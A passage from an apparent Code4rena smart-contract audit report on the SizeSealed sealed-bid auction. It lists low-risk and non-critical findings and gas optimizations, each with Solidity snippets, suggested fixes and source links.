[L-02] Unfair game for buyers\n    - [L-03] Design weakness\n    - [L-04] Seller can lock buyer tokens\n- **Non critical**\n    - [N-01] Integer overflow by unsafe casting\n    - [N-02] Add indexes to events\n    - [N-03] Add missing @param information\n    - [N-04] Be specific with comments\n    - [N-05] Unify return criteria\n    - [N-06] Don't worry about keccak256 collisions\n\n## Low risk\n\n### [L-01] Bid balance not ensured\n\nDuring `createAuction` the received `baseToken` balance is ensured to be received exactly, in order to avoid possible fees. \n\n```js\nuint256 balanceBeforeTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\n\nSafeTransferLib.safeTransferFrom(\n    ERC20(auctionParams.baseToken), msg.sender, address(this), auctionParams.totalBaseAmount\n);\n\nuint256 balanceAfterTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\nif (balanceAfterTransfer - balanceBeforeTransfer != auctionParams.totalBaseAmount) {\n    revert UnexpectedBalanceChange();\n}\n```\n\nThis check is not present during the `bid` procedure, is trusted in the `quoteToken`, but the true is because there are no token white list, the same checks should be done in order to ensure to be full compatible with tokens with fee (or empty).\n\n```js\nSafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);\n```\n\n**So `quoteToken` will allow empty address and it won't pass https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9.** \n\n**Affected source code:**\n\n- [SizeSealed.sol:163](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L163)\n\n### [L-02] Unfair game for buyers\n\n`cancelAuction` is available until the seller call `reveal` because only after that moment it's possible to call `finalize`.\n\nThe problem with this is that the buyers have committed themselves by spending gas to place a bid, and once the seller has had all the bids on the table, he can decide to leave, without selling, without disclosing and knowing all the bids, which It is like doing a market analysis without providing information, at the expense of the buyers, something that is not very advantageous for the buyer.\n\nFor that reason, I think that it should **not be possible** to cancel an auction if it's **under `RevealPeriod`**, and the seller should pay the gas cost of returning all bids to buyers upon cancellation.\n\n**Affected source code:**\n\n- [SizeSealed.sol:398](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L398)\n\n### [L-03] Design weakness\n\nAs the `SizeSealed` contract works, the buyer has to provide his bid in an encrypted way, however during the creation of the bid he has to provide the collateral for it. This makes it easier for buyers to adjust their collateral to their bid, so that the fact of encrypting it is meaningless, it would be more convenient for buyers to have a general balance, not related to the bid, and that the same balance be made on this balance, in this way, the balance of the sent user would not be related to the bid in question, and since someone is not incentivized in any way to send 100 eth and bid for 1, it would be more beneficial for buyers when it comes to do not reveal your move.\n\n**Affected source code:**\n\n- [SizeSealed.sol](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol)\n\n### [L-04] Seller can lock buyer tokens\n\nThe seller specify the vesting time for buyer's baseTokens, this value is not controlled and it's used for `tokensAvailableForWithdrawal` in order to allow buyers to `withdraw` his tokens. The problem is if the seller set an incredible high value, these tokens will be locked forever and buyer will loss his tokens for all of his life, this information is public, but maybe the date format is shown short in the dApp, like 1/10/23, and the year it's 3023, so it could be easy for the users to bid for a hole.\n\n**Affected source code:**\n\n- [SizeSealed.sol:66-70](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L66-L70)\n\n---\n\n## Non-critical\n\n### [N-01] Integer overflow by unsafe casting\n\nKeep in mind that the version of solidity used, despite being greater than `0.8`, does not prevent integer overflows during casting, it only does so in mathematical operations.\n\nIt is necessary to safely convert between the different numeric types.\n\n**Recommendation:**\n\nUse a [safeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from Open Zeppelin or increase the type length.\n\n```javascript\n        uint32(block.timestamp)\n```\n\n*In this case the date will overflow in: Sun Feb 07 2106 (2^32 - 1 equals to 4294967295)*\n\n**Affected source code:**\n\n- [SizeSealed.sol:460](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L460)\n- [CommonTokenMath.sol:62-66](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/CommonTokenMath.sol#L62-L66)\n\n### [N-02] Add indexes to events\n\nSolidity indexes help dApps and users to filter and process the information provided by smart contracts. That is why adding indexes in values that may be interesting for the user improves the usability of the contract.\n\n```diff\n    event AuctionCreated(\n-       uint256 auctionId, address seller, AuctionParameters params, Timings timings, bytes encryptedPrivKey\n+       uint256 indexed auctionId, address indexed seller, AuctionParameters params, Timings timings, bytes encryptedPrivKey\n    );\n\n    event AuctionCancelled(uint256 auctionId);\n\n    event Bid(\n-       address sender,\n-       uint256 auctionId,\n+       address indexed sender,\n+       uint256 indexed auctionId,\n        uint256 bidIndex,\n        uint128 quoteAmount,\n        bytes32 commitment,\n        ECCMath.Point pubKey,\n        bytes32 encryptedMessage,\n        bytes encryptedPrivateKey\n    );\n\n-   event BidCancelled(uint256 auctionId, uint256 bidIndex);\n+   event BidCancelled(uint256 indexed auctionId, uint256 bidIndex);\n\n-   event RevealedKey(uint256 auctionId, uint256 privateKey);\n+   event RevealedKey(uint256 indexed auctionId, uint256 privateKey);\n\n-   event AuctionFinalized(uint256 auctionId, uint256[] bidIndices, uint256 filledBase, uint256 filledQuote);\n+   event AuctionFinalized(uint256 indexed auctionId, uint256[] bidIndices, uint256 filledBase, uint256 filledQuote);\n\n-   event BidRefund(uint256 auctionId, uint256 bidIndex);\n+   event BidRefund(uint256 indexed auctionId, uint256 bidIndex);\n\n-   event Withdrawal(uint256 auctionId, uint256 bidIndex, uint256 withdrawAmount, uint256 remainingAmount);\n+   event Withdrawal(uint256 indexed auctionId, uint256 bidIndex, uint256 withdrawAmount, uint256 remainingAmount);\n```\n\n**Reference:**\n\n- https://docs.soliditylang.org/en/latest/contracts.html#events\n\n**Affected source code:**\n\n- [ISizeSealed.sol:97-122](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L97-L122)\n\n### [N-03] Add missing @param information\n\nSome parameters have not been commented, which reflects that the logic has been updated but not the documentation, it is advisable that developers update both at the same time to avoid the code being out of sync with the project documentation.\n\n**Affected source code:**\n\n- In [ISizeSealed.sol:82](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L82):\n\n```diff\n    /// @param baseToken The ERC20 to be sold by the seller\n    /// @param quoteToken The ERC20 to be bid by the bidders\n    /// @param reserveQuotePerBase Minimum price that bids will be filled at\n    /// @param totalBaseAmount Max amount of `baseToken` to be auctioned\n    /// @param minimumBidQuote Minimum quote amount a bid can buy\n+   /// @param merkleRoot seller's merkleRoot for whitelist bidders\n    /// @param pubKey On-chain storage of seller's ephemeral public key\n    struct AuctionParameters {\n        address baseToken;\n        address quoteToken;\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 minimumBidQuote;\n        bytes32 merkleRoot;\n        ECCMath.Point pubKey;\n    }\n```\n\n- In [SizeSealed.sol:177](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L177):\n\n```diff\n    /// @notice Reveals the private key of the seller\n    /// @dev All valid bids are decrypted after this\n    ///      finalizeData should be empty if seller does not wish to finalize in this tx\n+   /// @param auctionId `auctionId` of the auction to bid on\n    /// @param privateKey Private key corresponding to the auctions public key\n    /// @param finalizeData Calldata that will be sent to finalize()\n    function reveal(uint256 auctionId, uint256 privateKey, bytes calldata finalizeData)\n        external\n        atState(idToAuction[auctionId], States.RevealPeriod)\n    {\n```\n\n- In [ECCMath.sol:51](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L51):\n\n```diff\n    /// @notice decrypts a message that was encrypted using `encryptMessage()`\n    /// @param sharedPoint G^k1^k2 where k1 and k2 are the\n+   /// @param encryptedMessage encrypted message proporcionated by the other part\n    ///      private keys of the two parties that can decrypt\n    function decryptMessage(Point memory sharedPoint, bytes32 encryptedMessage)\n        internal\n        pure\n```\n\n### [N-04] Be specific with comments\n\n`cliffPercent` is based on 1e18, but this information was not shown in the code documentation.\n\n```diff\n    /// @dev Helper function to determine tokens at a specific `block.timestamp`\n    /// @return tokensAvailable Amount of unlocked `baseToken` at the current `block.timestamp`\n    /// @param vestingStart Start of linear vesting\n    /// @param vestingEnd Completion of linear vesting\n    /// @param currentTime Timestamp to evaluate at\n-   /// @param cliffPercent Normalized percent to unlock at vesting start\n+   /// @param cliffPercent Normalized percent to unlock at vesting start based on 1e18 factor\n    /// @param baseAmount Total amount of vested `baseToken`\n    function tokensAvailableAtTime(\n        uint32 vestingStart,\n        uint32 vestingEnd,\n        uint32 currentTime,\n        uint128 cliffPercent,\n        uint128 baseAmount\n    ) internal pure returns (uint128) {\n        if (currentTime > vestingEnd) {\n            return baseAmount; // If vesting is over, bidder is owed all tokens\n        } else if (currentTime <= vestingStart) {\n            return 0; // If cliff hasn't been triggered yet, bidder receives no tokens\n        } else {\n            // Vesting is active and cliff has triggered\n            uint256 cliffAmount = FixedPointMathLib.mulDivDown(baseAmount, cliffPercent, 1e18);\n\n            return uint128(\n                cliffAmount\n                    + FixedPointMathLib.mulDivDown(\n                        baseAmount - cliffAmount, currentTime - vestingStart, vestingEnd - vestingStart\n                    )\n            );\n        }\n    }\n```\n\n**Affected source code:**\n\n- [CommonTokenMath.sol:45](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/CommonTokenMath.sol#L45)\n\n### [N-05] Unify return criteria\n\nIn `ECCMath.sol` and `SizeSealed.sol` files, the methods are sometimes returned with return, other times the return variable is equal, and on other occasions the name of the return variable is not defined, unifying the way of writing the code makes the code more uniform and readable.\n\n```diff\n+   function publicKey(uint256 privateKey) internal view returns (Point memory) {\n+       return ecMul(Point(GX, GY), privateKey);\n    }\n\n+   function ecMul(Point memory point, uint256 scalar) internal view returns (Point memory) {\n        bytes memory data = abi.encode(point, scalar);\n        if (scalar == 0 || (point.x == 0 && point.y == 0)) return Point(1, 1);\n        (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(data);\n        if (!res) return Point(1, 1);\n+       return abi.decode(ret, (Point));\n    }\n\n+   function encryptMessage(Point memory encryptToPub, uint256 encryptWithPriv, bytes32 message)\n        internal view\n        returns (Point memory buyerPub, bytes32 encryptedMessage)\n    {\n        Point memory sharedPoint = ecMul(encryptToPub, encryptWithPriv);\n        bytes32 sharedKey = hashPoint(sharedPoint);\n+       encryptedMessage = message ^ sharedKey;\n+       buyerPub = publicKey(encryptWithPriv);\n    }\n\n    function decryptMessage(Point memory sharedPoint, bytes32 encryptedMessage)\n        internal pure\n+       returns (bytes32 decryptedMessage)\n    {\n+       return encryptedMessage ^ hashPoint(sharedPoint);\n    }\n\n+   function hashPoint(Point memory point) internal pure returns (bytes32) {\n+       return keccak256(abi.encode(point));\n    }\n```\n\n**Affected source code:**\n\n- [ECCMath.sol:18-60](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L18-L60)\n- [SizeSealed.sol:466-480](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L466-L480)\n\n## [N-06] Don't worry about keccak256 collisions\n\nWhen `cancelBid` is called, the `commitment` is set to 0 in order to force to fail the `computeCommitment` comparison.\n\n```js\n    function cancelBid(uint256 auctionId, uint256 bidIndex)\n        external\n    {\n        ...\n\n        // Prevent any futher access to this EncryptedBid\n        b.sender = address(0);\n\n        // Prevent seller from finalizing a cancelled bid\n        b.commitment = 0;\n```\n\nIn case of the result of `computeCommitment` returns 0, because a collision or an error, a cancelled bid will be processed as valid.\n\n```js\n            bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n            // If the bidder didn't faithfully submit commitment or pubkey\n            // Or the bid was cancelled\n            if (computeCommitment(decryptedMessage) != b.commitment) continue;\n```\n\nIt's more resilient to use a different value as flag, `b.pubKey` will be safer and cheaper.\n\n**Affected source code:**\n\n- [SizeSealed.sol:258](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258)\n- [SizeSealed.sol:435](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L435)\n\n**[0xean (judge) confirmed severity for all issues](https://github.com/code-423n4/2022-11-size-findings/issues/57#issuecomment-1363003042)**\n\n***\n\n# Gas Optimizations\n\nFor this contest, 31 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-11-size-findings/issues/56) by **0x1f8b** received the top score from the judge.\n\n*The following wardens also submitted reports: [JC](https://github.com/code-423n4/2022-11-size-findings/issues/326), \n[Aymen0909](https://github.com/code-423n4/2022-11-size-findings/issues/322), \n[0xSmartContract](https://github.com/code-423n4/2022-11-size-findings/issues/314), \n[halden](https://github.com/code-423n4/2022-11-size-findings/issues/313), \n[B2](https://github.com/code-423n4/2022-11-size-findings/issues/312), \n[Deivitto](https://github.com/code-423n4/2022-11-size-findings/issues/305), \n[djxploit](https://github.com/code-423n4/2022-11-size-findings/issues/296), \n[lukris02](https://github.com/code-423n4/2022-11-size-findings/issues/295), \n[mcwildy](https://github.com/code-423n4/2022-11-size-findings/issues/283), \n[gogo](https://github.com/code-423n4/2022-11-size-findings/issues/273), \n[TomJ](https://github.com/code-423n4/2022-11-size-findings/issues/229), \n[ret2basic](https://github.com/code-423n4/2022-11-size-findings/issues/216), \n[ajtra](https://github.com/code-423n4/2022-11-size-findings/issues/211), \n[karanctf](https://github.com/code-423n4/2022-11-size-findings/issues/187), \n[slowmoses](https://github.com/code-423n4/2022-11-size-findings/issues/182), \n[Dinesh11G](https://github.com/code-423n4/2022-11-size-findings/issues/160), \n[cryptostellar5](https://github.com/code-423n4/2022-11-size-findings/issues/157), \n[Sathish9098](https://github.com/code-423n4/2022-11-size-findings/issues/155), \n[Diana](https://github.com/code-423n4/2022-11-size-findings/issues/139), \n[aviggiano](https://github.com/code-423n4/2022-11-size-findings/issues/133), \n[oyc\\_109](https://github.com/code-423n4/2022-11-size-findings/issues/111), \n[Rolezn](https://github.com/code-423n4/2022-11-size-findings/issues/99), \n[gianganhnguyen](https://github.com/code-423n4/2022-11-size-findings/issues/91), \n[0xdeadbeef](https://github.com/code-423n4/2022-11-size-findings/issues/88), \n[chaduke](https://github.com/code-423n4/2022-11-size-findings/issues/74), \n[ReyAdmirado](https://github.com/code-423n4/2022-11-size-findings/issues/61), \n[Bnke0x0](https://github.com/code-423n4/2022-11-size-findings/issues/52), \n[skyle](https://github.com/code-423n4/2022-11-size-findings/issues/12), \n[RaymondFam](https://github.com/code-423n4/2022-11-size-findings/issues/4), and \n[leosathya](https://github.com/code-423n4/2022-11-size-findings/issues/2).*\n\n- **[G-01] Optimize finalize with cancelled bids**\n- **[G-02] Avoid storage keyword during modifiers**\n- **[G-03] Reorder structure layout**\n- **[G-04] Avoid compound assignment operator in state variables**\n- **[G-05] Optimize variable definitions**\n- **[G-06] Optimize finalize conditions**\n\n## [G-01] Optimize `finalize` with cancelled bids\n\nWhen `cancelBid` is called, the `commitment` is set to 0 in order to force to fail the `computeCommitment` comparison.\n\n```js\n    function cancelBid(uint256 auctionId, uint256 bidIndex)\n        external\n    {\n        ...\n\n        // Prevent any futher access to this EncryptedBid\n        b.sender = address(0);\n\n        // Prevent seller from finalizing a cancelled bid\n        b.commitment = 0;\n```\n\n This can be cheaper if `b.pubKey` is set to 0,0, because `ECCMath.ecMul` will return a (1,1) point and it will save all the `decryptMessage` from cancelled bids.\n\n```js\n            ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);\n            // If the bidder public key isn't on the bn128 curve\n            if (sharedPoint.x == 1 && sharedPoint.y == 1) continue;\n\n            bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n            // If the bidder didn't faithfully submit commitment or pubkey\n            // Or the bid was cancelled\n            if (computeCommitment(decryptedMessage) != b.commitment) continue;\n```\n\n*Note: This also will be more secure because `computeCommitment` could return 0 with a collision, and process the cancelled bid as valid.*\n\n**Affected source code:**\n\n- [SizeSealed.sol:258](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258)\n- [SizeSealed.sol:435](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L435)\n\n## [G-02] Avoid `storage` keyword during modifiers\n\nThe problem with using modifiers with storage variables is that these accesses will likely have to be obtained multiple times, to pass it to the modifier, and to read it into the method code.\n\n```js\n    modifier atState(Auction storage a, States _state) {\n        if (block.timestamp < a.timings.startTimestamp) {\n            if (_state != States.Created) revert InvalidState();\n        } else if (block.timestamp < a.timings.endTimestamp) {\n            if (_state != States.AcceptingBids) revert InvalidState();\n        } else if (a.data.lowestQuote != type(uint128).max) {\n            if (_state != States.Finalized) revert InvalidState();\n        } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {\n            if (_state != States.RevealPeriod) revert InvalidState();\n        } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {\n            if (_state != States.Voided) revert InvalidState();\n        } else {\n            revert();\n        }\n        _;\n    }\n```\n\nAs you can see the following methods require to extract the `Auction` twice instead of once, it is recommended to use a method instead of a modifier\n\n```js\n    function bid(...) external \n        atState(idToAuction[auctionId], States.AcceptingBids) \n        returns (uint256) {\n            Auction storage a = idToAuction[auctionId];\n```\n\n**Affected source code:**\n\n- [SizeSealed.sol:130-131](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L130-L131)\n- [SizeSealed.sol:179-181](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L179-L181)\n- [SizeSealed.sol:219-221](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L219-L221)\n- [SizeSealed.sol:336-337](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L336-L337)\n- [SizeSealed.sol:359](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L359)\n\n## [G-03] Reorder structure layout\n\nThe following structures could be optimized moving the position of certain values in order to save a lot slots:\n\n```diff\n    struct EncryptedBid {\n        address sender;\n+       ECCMath.Point pubKey;\n        uint128 quoteAmount;\n        uint128 filledBaseAmount;\n        uint128 baseWithdrawn;\n        bytes32 commitment;\n-       ECCMath.Point pubKey;\n        bytes32 encryptedMessage;\n    }\n```\n\n```diff\n    struct AuctionParameters {\n        address baseToken;\n        address quoteToken;\n+       ECCMath.Point pubKey;\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 minimumBidQuote;\n        bytes32 merkleRoot;\n-       ECCMath.Point pubKey;\n    }\n```\n\n**Reference:**\n\n- https://ethdebug.github.io/solidity-data-representation\n\n> Enums are represented by integers; the possibility listed first by 0, the next by 1, and so forth. An enum type just acts like uintN, where N is the smallest legal value large enough to accomodate all the possibilities.\n\n- https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#storage-inplace-encoding\n\n**Affected source code:**\n\n- [ISizeSealed.sol:46](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L46)\n- [ISizeSealed.sol:83](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L83)\n\n## [G-04] Avoid compound assignment operator in state variables\n\nUsing compound assignment operators for state variables (like `State += X` or `State -= X` ...) it's more expensive than using operator assignment (like `State = State + X` or `State = State - X` ...).\n\n**Proof of concept (*without optimizations*):**\n\n```javascript\npragma solidity 0.8.15;\n\ncontract TesterA {\nuint256 private _a;\nfunction testShort() public {\n_a += 1;\n}\n}\n\ncontract TesterB {\nUint256 private _a;\nfunction testLong() public {\n_a = _a + 1;\n}\n}\n```\n\nGas saving executing: **13 per entry**\n\n```\nTesterA.testShort: 43507\nTesterB.testLong:  43494\n```\n\n**Affected source code:**\n\n- [SizeSealed.sol:294](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L294)\n- [SizeSealed.sol:373](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L373)\n\n### Total gas saved: **13 &ast; 2 = 26**\n\n## [G-05] Optimize variable definitions\n\nWhere a variable is defined, it is important to avoid unnecessary expense prior to the appropriate validations.\n\n**Affected source code:**\n\n- [ECCMath.sol:26](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L26) can be optimized like:\n\n```diff\n    /// @notice calculates point^scalar\n    /// @dev returns (1,1) if the ecMul failed or invalid parameters\n    /// @return corresponding point\n    function ecMul(Point memory point, uint256 scalar) internal view returns (Point memory) {\n-       bytes memory data = abi.encode(point, scalar);\n        if (scalar == 0 || (point.x == 0 && point.y == 0)) return Point(1, 1);\n-       (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(data);\n+       (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(abi.encode(point, scalar));\n        if (!res) return Point(1, 1);\n        return abi.decode(ret, (Point));\n    }\n```\n\n- [SizeSealed.sol:157](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L157) can be optimized like:\n\n```diff\n    function bid(\n        uint256 auctionId,\n        uint128 quoteAmount,\n        bytes32 commitment,\n        ECCMath.Point calldata pubKey,\n        bytes32 encryptedMessage,\n        bytes calldata encryptedPrivateKey,\n        bytes32[] calldata proof\n    ) external atState(idToAuction[auctionId], States.AcceptingBids) returns (uint256) {\n        ...\n\n+       uint256 bidIndex = a.bids.length;\n+       // Max of 1000 bids on an auction to prevent DOS\n+       if (bidIndex >= 1000) {\n+           revert InvalidState();\n+       }\n\n        EncryptedBid memory ebid;\n        ebid.sender = msg.sender;\n        ebid.quoteAmount = quoteAmount;\n        ebid.commitment = commitment;\n        ebid.pubKey = pubKey;\n        ebid.encryptedMessage = encryptedMessage;\n\n-       uint256 bidIndex = a.bids.length;\n-       // Max of 1000 bids on an auction to prevent DOS\n-       if (bidIndex >= 1000) {\n-           revert InvalidState();\n-       }\n\n        a.bids.push(ebid);\n\n        SafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);\n\n        emit Bid(\n            msg.sender, auctionId, bidIndex, quoteAmount, commitment, pubKey, encryptedMessage, encryptedPrivateKey\n        );\n\n        return bidIndex;\n    }\n```\n\n## [G-06] Optimize `finalize` conditions\n\nIf the auction has been fully filled, it's not required to decrypt the message and do nothing else.\n\n```diff\n    function finalize(uint256 auctionId, uint256[] memory bidIndices, uint128 clearingBase, uint128 clearingQuote)\n        public\n        atState(idToAuction[auctionId], States.RevealPeriod)\n    {\n        ...\n\n        // Fill orders from highest price to lowest price\n        for (uint256 i; i < bidIndices.length; i++) {\n            uint256 bidIndex = bidIndices[i];\n            EncryptedBid storage b = a.bids[bidIndex];\n\n            // Verify this bid index hasn't been seen before\n            uint256 bitmapIndex = bidIndex / 256;\n            uint256 bitMap = seenBidMap[bitmapIndex];\n            uint256 indexBit = 1 << (bidIndex % 256);\n            if (bitMap & indexBit == 1) revert InvalidState();\n            seenBidMap[bitmapIndex] = bitMap | indexBit;\n\n+           // Auction has been fully filled\n+           if (data.filledBase == data.totalBaseAmount) continue;\n\n            // G^k1^k2 == G^k2^k1\n            ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);\n            // If the bidder public key isn't on the bn128 curve\n            if (sharedPoint.x == 1 && sharedPoint.y == 1) continue;\n\n            bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n            // If the bidder didn't faithfully submit commitment or pubkey\n            // Or the bid was cancelled\n            if (computeCommitment(decryptedMessage) != b.commitment) continue;\n\n            // First 128 bits are the base amount, last are random salt\n            uint128 baseAmount = uint128(uint256(decryptedMessage >> 128));\n\n            // Require that bids are passed in descending price\n            uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n            if (quotePerBase >= data.previousQuotePerBase) {\n                // If last bid was the same price, make sure we filled the earliest bid first\n                if (quotePerBase == data.previousQuotePerBase) {\n                    if (data.previousIndex > bidIndex) revert InvalidSorting();\n                } else {\n                    revert InvalidSorting();\n                }\n            }\n\n            // Only fill if above reserve price\n            if (quotePerBase < data.reserveQuotePerBase) continue;\n\n-           // Auction has been fully filled\n-           if (data.filledBase == data.totalBaseAmount) continue;\n\n            ...\n        }\n\n        ...\n    }\n```\n\n**Affected source code:**\n\n- [SizeSealed.sol:283](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L283)\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}